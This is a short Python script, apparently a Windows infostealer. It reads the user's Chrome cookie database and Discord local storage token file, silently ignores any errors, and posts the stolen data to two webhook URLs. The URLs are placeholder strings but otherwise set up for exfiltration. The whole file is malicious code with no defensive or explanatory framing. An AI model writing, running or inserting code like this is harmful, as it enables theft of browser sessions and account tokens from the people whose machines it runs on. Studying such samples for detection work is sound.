import os
import ctypes
import requests

WEBHOOK_URL = "Webhook man"
DISCORD_WEBHOOK_URL = "webhook woman"

def read_cookies(username):
    cookies = ""
    try:
        with open(f"C:/Users/{username}/AppData/Local/Google/Chrome/User Data/Default/Cookies", "rb") as f:
            cookies = f.read()
    except:
        pass
    return cookies

def read_discord_token(username):
    token = ""
    try:
        with open(f"C:/Users/{username}/AppData/Roaming/discord/Local Storage/https_discordapp.com_0.localstorage", "rb") as f:
            token = f.read()
    except:
        pass
    return token

def get_username():
    buf = ctypes.create_unicode_buffer(256)
    ctypes.windll.user32.GetUserNameW(buf, ctypes.byref(ctypes.c_uint(256)))
    return buf.value

if __name__ == "__main__":
    username = get_username()
    cookies = read_cookies(username)
    discord_token = read_discord_token(username)
    if cookies:
        response = requests.post(WEBHOOK_URL, data=cookies)
    if discord_token:
        response = requests.post(DISCORD_WEBHOOK_URL, data=discord_token)
